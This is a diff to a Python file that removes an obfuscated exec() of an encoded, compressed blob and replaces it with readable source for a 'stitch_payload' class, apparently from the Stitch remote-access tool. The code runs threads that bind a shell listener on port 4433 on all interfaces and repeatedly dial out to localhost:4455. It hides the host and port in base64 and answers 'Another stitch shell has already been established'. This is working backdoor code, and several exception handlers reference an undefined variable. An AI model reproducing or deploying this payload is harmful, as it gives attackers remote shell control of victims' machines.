@@ -1,3 +1,108 @@
-from requirements import *
+#!/usr/bin/env python
+# TODO: Replace wildcard import with specific imports
+# TODO: Replace wildcard import with specific imports
+from st_utils import *
 
-exec(SEC(INFO("eJztV99v2zYQfvdfcXUeLA+ek6JdgBXQQ7C4Q9HVQRMPw7ANBCWeI640KYh0HPev31E/bFOS7aId9jS+2JbuPh7vvvt4vnhxubbFZSL1JeonyLcuM3pwAYu727s3cI+54inCRiqR8kKAXOWmcPTbZWBzTOVSpvVD+5Vey8KswDq2dlLZxvS7wSBV3Fp6IV2asZxvleEiGr8ZDIBWarTG1KGAGN5yZbF6LHAJdBTBLBZPWEQW1ZJcoF6pkqgdsyb9hC6eG427V95yap3J2YH/DryxugC5BG3A8eIRHUjrd5QaxQQ2CEpahxqMBq4USO2wWFIe7M6dnEXyuI/Hr7wgw2iUFsid1I9Q7TwaH0RWh1KFPa0+ovrXzVv2bj5bTJq3D3c/vWcPi/vZzYc2xNSi81Ym33k/3P3CvEcAwO5nvz7Mbm5v7yfwcg9SnzmGhFu8fj1Nrl8LTI3AaDjcW5XVi/3ho67d/Pbj5w+bOB6OO7H5rEdRtcfEg3RNqvRGP+xfbDKpEBbFGsOcUp576xla+ZVQ2j8FT/e5cnKFZu0ONyzzUGy7OAGzJsCFKCtWYfE0Rcr5uOPV3ctzsmsXoJ82x2e/F8zKD2l0N9Q+EjarIuO5CMLO2flSu7arELj1hqKNq2q16+j+yEIbyq2veq9lvWfGtVAkAUEI3YP1YodN3yykh8eCI/KGFBj+8eIvuKHTZdS7lYiBzZB0IeOW9IF4J7aQIOkFWscTIneGYvqnHvbHGFIgVcZii1Anxa3kWeO1k8qMK8dO6OUxUSxzv4epGvMsRmAGnTR/UTOHGF/SzxXsOYpZhZi3O92vPlb3tk+t46QOXsWdaa6o0YkqfZOod9C+Ud978Y5p4PG7IPn5x79//+3ZJK/mVy0un7sbXs4/hndDudVZuW3qeuz6OHu4V1dXXev/telf1Kb/4lY6Im9fJU47ifMwKy51VDs1rKim0mKtNXV7dIjoWL5VvlDtyXU/SLUZ7cWVHFzmE09400X5raZzXENODzSYJozi0cZRi+X1AHoeKjjtETC/3VRwXBndR+kK4oRB6U/0KdqTT+15+Gr/z+FJ4ga+J42gsVo6mqmNyakCW9BI9Mdn6bywCulZ1KPz3eujLEqp7tcHXV4T8j1uE0P/UN75Wb1Y560ZJRD/0xw+fS20uBvgNjXpXMbjfpOQ0ET3Ae3NmOYrZAziGEaMecoyNqrCqfg7+AcUBOU1")))
+class stitch_payload():
+
+    connected = False
+
+    def bind_server(self):
+        client_socket=None
+        self.stop_bind_server = False
+        # if no target is defined, we listen on all interfaces
+        if dbg:
+            print('creating server')
+        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        target = base64.b64decode("")
+        port = int(base64.b64decode("NDQzMw=="))
+        server.bind((target,port))
+        server.listen(5)
+        while True:
+            if self.stop_bind_server:
+                break
+            server.settimeout(5)
+            try:
+                client_socket, addr = server.accept()
+                server.settimeout(None)
+                client_socket.settimeout(None)
+            except Exception:
+                if dbg:
+                    print(e)
+                client_socket=None
+                pass
+            if client_socket:
+                if not self.connected:
+                    self.connected = True
+                    client_handler(client_socket)
+                    self.connected = False
+                else:
+                    send(client_socket,"[!] Another stitch shell has already been established.\n")
+                    client_socket.close()
+            client_socket=None
+        server.close()
+
+    def halt_bind_server(self):
+        self.stop_bind_server = True
+
+
+    def listen_server(self):
+        self.stop_listen_server  = False
+        while True:
+            if self.stop_listen_server :
+                break
+            while self.connected:
+                sleep(5)
+                pass
+            if dbg:
+                print('trying to connect')
+            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            client_socket.settimeout(5)
+            target = base64.b64decode("bG9jYWxob3N0")
+            port = int(base64.b64decode("NDQ1NQ=="))
+            try:
+                client_socket.connect((target,port))
+                client_socket.settimeout(300)
+                if not self.connected:
+                    self.connected = True
+                    client_handler(client_socket)
+                    self.connected = False
+                else:
+                    send(client_socket,"[!] Another stitch shell has already been established.\n")
+                    client_socket.close()
+            except Exception:
+                if dbg:
+                    print(e)
+                client_socket.close()
+
+    def halt_listen_server(self):
+        self.stop_listen_server = True
+
+
+def main():
+    if not stitch_running():
+        st_pyld = stitch_payload()
+        try:
+            bind = threading.Thread(target=st_pyld.bind_server, args=())
+            listen = threading.Thread(target=st_pyld.listen_server, args=())
+            bind.daemon = True
+            listen.daemon = True
+            bind.start()
+            listen.start()
+    # TODO: Review - infinite loop may need exit condition
+            while True:
+                sleep(60)
+        except KeyboardInterrupt:
+            pass
+        except Exception:
+            if dbg:
+                print(e)
+            pass
+        st_pyld.halt_bind_server()
+        st_pyld.halt_listen_server()
+
+
+if __name__ == '__main__':
+    main()
